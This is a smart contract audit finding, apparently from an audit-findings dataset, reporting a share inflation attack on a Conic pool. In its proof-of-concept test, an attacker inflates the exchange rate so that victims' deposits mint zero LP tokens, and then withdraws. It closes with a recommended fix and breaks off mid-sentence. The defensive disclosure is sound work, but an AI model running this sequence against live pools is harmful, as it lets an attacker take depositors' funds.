# [M] M-20 exchangeRate can be manipulated

## Summary
Severity: Medium
Contest weight: 0.1286
Dataset id: 6753
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
• BaseConicPool.sol#L290
When creating a pool, the user has an option to change the exchangeRate directly by sending tokens to ConicPool.
Test example:
vm.startPrank(bb8); // hacker is setting exchangeRate
conicPool.deposit(2, 0, false);
underlying.transfer(address(conicPool), 2 * 10**18);
vm.stopPrank();
now totalSupply = 1,
exchangeRate = 2000000000000000001000000000000000000 (~1036)
victims try to deposit to ConicPool and will get zero lp tokens
vm.startPrank(r2);
underlying.approve(address(conicPool), 10**18);
conicPool.deposit(10**18, 0, false);
vm.stopPrank();
vm.startPrank(bb8); // withdraw all tokens from pool by hacker
conicPool.withdraw(1, 0);
This way an attacker can make the use of omnipool unprofitable at the very beginning.

## Recommendation
There are different approaches on how to solve the Inflation Attack problem. Some of the approaches along with their pros and cons, can be found in the OpenZeppelin github issue: https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3706.
One way to resolve the problem is to use virtual dead shares, as implemented in the latest OpenZeppelin
